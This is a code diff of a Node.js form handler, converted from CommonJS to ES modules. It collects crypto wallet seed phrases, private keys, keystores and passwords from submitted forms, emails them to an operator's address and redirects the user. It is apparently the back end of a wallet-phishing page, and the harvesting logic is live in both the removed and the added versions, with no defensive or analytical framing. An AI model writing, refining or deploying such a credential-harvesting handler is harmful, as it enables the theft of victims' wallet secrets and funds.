@@ -1,76 +1,46 @@
-const nodemailer = require('nodemailer');
-const { parse } = require('querystring');
+import nodemailer from 'nodemailer';
+import { parse } from 'querystring';
 
-async function parseBody(req) {
-  const contentType = req.headers['content-type'] || '';
-
-  if (req.body && typeof req.body === 'object' && !Array.isArray(req.body)) {
-    return req.body;
-  }
-
-  if (typeof req.body === 'string') {
-    if (contentType.includes('application/json')) {
-      return req.body ? JSON.parse(req.body) : {};
-    }
-
-    return req.body ? parse(req.body) : {};
-  }
-
-  if (contentType.includes('application/json')) {
-    const chunks = [];
-    if (req.readable && typeof req.on === 'function') {
-      const data = await new Promise((resolve, reject) => {
-        req.setEncoding('utf8');
-        let raw = '';
-        req.on('data', (chunk) => { raw += chunk; });
-        req.on('end', () => resolve(raw));
-        req.on('error', reject);
-      });
-      return data ? JSON.parse(data) : {};
-    }
-
-    return {};
-  }
-
-  if (contentType.includes('multipart/form-data')) {
-    return {};
-  }
-
-  if (req.readable && typeof req.on === 'function') {
-    const data = await new Promise((resolve, reject) => {
-      req.setEncoding('utf8');
-      let raw = '';
-      req.on('data', (chunk) => { raw += chunk; });
-      req.on('end', () => resolve(raw));
-      req.on('error', reject);
-    });
-    return data ? parse(data) : {};
-  }
-
-  return {};
-}
-
-module.exports = async function handler(req, res) {
+export default async function handler(req, res) {
+  // Only allow POST requests
   if (req.method !== 'POST') {
     return res.status(405).send('Method not allowed');
   }
 
+  const body = typeof req.body === 'string' ? parse(req.body) : (req.body || {});
+  const {
+    wallet_name,
+    walletName,
+    phase,
+    pw: password,
+    password: passwordField,
+    seedphrase,
+    phrase,
+    privateKey,
+    privatekey,
+    private_key,
+    keystore,
+    keystorePassword,
+    keystore_password,
+  } = body;
+
+  const walletNameValue = wallet_name || walletName || '';
+  const phaseValue = phase || '';
+  const passwordValue = password || passwordField || keystorePassword || keystore_password || '';
+  const seedPhraseValue = seedphrase || phrase || '';
+  const privateKeyValue = privateKey || privatekey || private_key || '';
+  const keystoreValue = keystore || '';
+
+  // Validate required fields
+  if (!phaseValue || phaseValue.trim() === '') {
+    return res.status(400).send('Required field missing.');
+  }
+
   try {
-    const body = await parseBody(req);
-    const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || 'N/A';
-    const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
-    const password = body.pw || body.password || body.keystorePassword || body.privateKey || body.seedphrase || 'N/A';
-    const seedphrase = body.seedphrase || body.seedphraseInput || 'N/A';
-    const privateKey = body.privateKey || body.privateKeyInput || 'N/A';
-    const keystorePassword = body.keystorePassword || body.keystorePasswordInput || 'N/A';
-
-    if (!phase || phase.trim() === '') {
-      return res.status(400).send('Required field missing.');
-    }
-
+    // Create transporter with environment variables
     const transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
-      port: parseInt(process.env.SMTP_PORT || '587', 10),
+      port: parseInt(process.env.SMTP_PORT || '587'),
       secure: process.env.SMTP_PORT === '465',
       auth: {
         user: process.env.SMTP_USER,
@@ -78,25 +48,30 @@ module.exports = async function handler(req, res) {
       },
     });
 
+    // Prepare email
     const mailOptions = {
-      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
-      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
-      subject: 'New Wallet Import Submission',
+      from: `${process.env.SMTP_FROM_NAME} <${process.env.SMTP_FROM_EMAIL}>`,
+      to: process.env.RECIPIENT_EMAIL,
+      subject: 'New Form Submission',
       text: [
-        `Wallet: ${walletName}`,
-        `Phase: ${phase}`,
-        `Seedphrase: ${seedphrase}`,
-        `Private Key: ${privateKey}`,
-        `Keystore Password: ${keystorePassword}`,
-        `Password: ${password}`,
+        `Wallet Name: ${walletNameValue}`,
+        `Phase: ${phaseValue}`,
+        `Seed Phrase: ${seedPhraseValue}`,
+        `Private Key: ${privateKeyValue}`,
+        `Keystore: ${keystoreValue}`,
+        `Password: ${passwordValue}`,
       ].join('\n'),
     };
 
+    // Send email
     await transporter.sendMail(mailOptions);
-    res.writeHead(302, { Location: '/rdr.html' });
+
+    // Redirect to the original behavior
+    res.writeHead(302, { 'Location': '/rdr.html' });
     res.end();
+
   } catch (error) {
     console.error('Email error:', error);
     res.status(500).send('Message could not be sent. Error: ' + error.message);
   }
-};
+}
